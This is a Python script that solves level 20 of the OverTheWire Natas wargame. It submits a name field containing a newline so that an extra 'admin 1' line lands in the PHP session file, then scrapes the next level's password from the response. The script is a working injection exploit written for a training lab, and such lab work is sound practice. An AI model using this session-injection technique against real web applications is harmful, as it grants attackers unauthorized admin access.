import re,requests,base64,natas

B64 = 'Basic %s' % base64.b64encode('%s:%s' % ('natas20', natas.get_credential('natas20')))
URL = 'http://natas20.natas.labs.overthewire.org/index.php?debug'

"""
The objective in this puzzle is to inject an extra line into the name variable.
This will then be written to a file as an extra variable, which will show the password on the following GET request.
"""

def main():
    injection = 'admin\nadmin 1'
    
    cookie = requests.post (
            URL,
            headers=dict(Authorization=B64),
            data={
                'name':injection
            }
    ).cookies['PHPSESSID']
    
    print('cookie: %s' % cookie)

    response = requests.get (
            URL,
            headers=dict(Authorization=B64),
            cookies=dict(PHPSESSID=cookie)
    )
    
    regex=r"Password: (\w+)"
    matches=re.finditer(regex,response.content,re.MULTILINE)

    for match in matches:
        print('found password: %s' % match.group(1))
        print('adding to credentials....')
        natas.save_credentials('natas21', match.group(1))
        print('done')
        break



if __name__ == '__main__':
    main()
